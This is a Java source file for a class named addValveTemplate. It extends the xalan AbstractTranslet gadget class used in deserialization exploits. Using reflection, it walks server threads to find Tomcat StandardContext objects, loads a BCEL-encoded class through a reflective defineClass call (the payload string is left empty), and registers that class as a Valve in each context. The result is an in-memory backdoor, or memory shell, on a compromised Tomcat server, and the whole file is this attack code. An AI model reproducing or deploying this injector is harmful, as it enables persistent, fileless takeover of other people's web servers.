package source;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Valve;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardEngine;
import org.apache.catalina.core.StandardHost;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class addValveTemplate extends AbstractTranslet {
    private String uri;
    private String serverName;
    private ArrayList<StandardContext> standardContext_ = new ArrayList<>();
    private ArrayList<StandardContext> standardContext__ = new ArrayList<>();

    public addValveTemplate() {
        super();
        this.getThread();
        ArrayList<StandardContext> standardCtx = this.getSTC();
        String s = "";
        Object o=null;
        try {
            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
            byte[] d = com.sun.org.apache.bcel.internal.classfile.Utility.decode(s,true);
            Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
            Method defineClass = aClass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            o = ((Class) defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
        for (StandardContext standardCtx_ : standardCtx) {
            try { standardCtx_.addValve((Valve) o); }catch (Exception e){ continue; }
        }
    }

    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException e) {
            } catch (IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public void getThread() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("exec")) {
                continue;
            }
            Object target = this.getField(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }

            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            if (object == null) {
                continue;
            }
            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();

                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)) {
                    continue;
                }
                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                this.serverName = (String) getField(serverNameMB, "strValue");
                if (this.serverName == null) {
                    this.serverName = serverNameMB.toString();
                }
                if (this.serverName == null) {
                    this.serverName = serverNameMB.getString();
                }

                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "uriMB");
                this.uri = (String) getField(uriMB, "strValue");
                if (this.uri == null) {
                    this.uri = uriMB.toString();
                }
                if (this.uri == null) {
                    this.uri = uriMB.getString();
                }

                this.getStandardContext();
                return;
            }
        }
    }

    public void getStandardContext() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        return;
                    }
                }
                Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
                StandardEngine engine = null;
                try {
                    engine = (StandardEngine) getField(service, "container");
                } catch (Exception e) {
                }
                if (engine == null) {
                    engine = (StandardEngine) getField(service, "engine");
                }
                children = (HashMap) getField(engine, "children");

                StandardHost standardHost = null;
                Iterator<Map.Entry<String, StandardHost>> entryIterator = children.entrySet().iterator();
                while (entryIterator.hasNext()) {
                    Map.Entry<String, StandardHost> entry = entryIterator.next();
                    standardHost = entry.getValue();
                    children = (HashMap) getField(standardHost, "children");
                    Iterator iterator = children.keySet().iterator();
                    while (iterator.hasNext()) {
                        String contextKey = (String) iterator.next();
                        if (!(this.uri.startsWith(contextKey))) {
                            continue;
                        }
                        StandardContext standardContext = (StandardContext) children.get(contextKey);
                        this.standardContext_.add(standardContext);
                    }
                }
            }
        }
    }

    public ArrayList<StandardContext> getSTC() {
        for (int i = 0; i < this.standardContext_.size(); i++) {
            if (!this.standardContext__.contains(this.standardContext_.get(i)))
                this.standardContext__.add(this.standardContext_.get(i));
        }
        return this.standardContext__;
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
